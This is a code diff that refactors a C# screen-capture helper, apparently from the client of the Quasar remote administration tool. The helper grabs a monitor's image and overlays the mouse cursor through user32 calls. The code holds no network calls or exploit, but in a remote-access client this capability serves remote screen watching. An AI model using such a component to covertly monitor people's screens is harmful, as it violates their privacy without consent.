@@ -2,21 +2,19 @@
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
-using Quasar.Client.Utilities;
 using System.Runtime.InteropServices;
-
 
 namespace Quasar.Client.Helper
 {
     public static class ScreenHelper
     {
-        const Int32 CURSOR_SHOWING = 0x00000001;
+        private const int CURSOR_SHOWING = 0x00000001;
 
         [StructLayout(LayoutKind.Sequential)]
         public struct POINT
         {
-            public int x;
-            public int y;
+            public int X;
+            public int Y;
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -25,45 +23,50 @@ namespace Quasar.Client.Helper
             public int cbSize;
             public int flags;
             public IntPtr hCursor;
-            public POINT ptScreenPos;
+            public POINT ScreenPosition;
         }
 
         [DllImport("user32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool GetCursorInfo(out CURSORINFO pci);
+        private static extern bool GetCursorInfo(out CURSORINFO pci);
 
         [DllImport("user32.dll")]
-        public static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
+        private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
 
         public static Bitmap CaptureScreen(int screenNumber)
         {
-            Rectangle bounds = Screen.AllScreens[screenNumber].Bounds;
-            Bitmap result;
-            try
+            var bounds = Screen.AllScreens[screenNumber].Bounds;
+            var bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
+
+            using (var graphics = Graphics.FromImage(bitmap))
             {
-                Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
-                using (Graphics graphics = Graphics.FromImage(bitmap))
+                IntPtr hdc = IntPtr.Zero;
+                try
                 {
                     graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
 
-                    CURSORINFO cursorinfo;
-                    cursorinfo.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
-                    if (GetCursorInfo(out cursorinfo))
+                    var cursorInfo = new CURSORINFO { cbSize = Marshal.SizeOf(typeof(CURSORINFO)) };
+                    if (GetCursorInfo(out cursorInfo) && cursorInfo.flags == CURSOR_SHOWING)
                     {
-                        if (cursorinfo.flags == CURSOR_SHOWING)
-                        {
-                            DrawIcon(graphics.GetHdc(), cursorinfo.ptScreenPos.x - bounds.X, cursorinfo.ptScreenPos.y - bounds.Y, cursorinfo.hCursor);
-                            graphics.ReleaseHdc();
-                        }
+                        hdc = graphics.GetHdc();
+                        DrawIcon(hdc, cursorInfo.ScreenPosition.X - bounds.X, cursorInfo.ScreenPosition.Y - bounds.Y, cursorInfo.hCursor);
                     }
-                    result = bitmap;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error capturing screen: {ex.Message}");
+                    return new Bitmap(bounds.Width, bounds.Height);
+                }
+                finally
+                {
+                    if (hdc != IntPtr.Zero)
+                    {
+                        graphics.ReleaseHdc(hdc);
+                    }
                 }
             }
-            catch
-            {
-                result = new Bitmap(bounds.Width, bounds.Height);
-            }
-            return result;
+
+            return bitmap;
         }
 
         public static Rectangle GetBounds(int screenNumber)
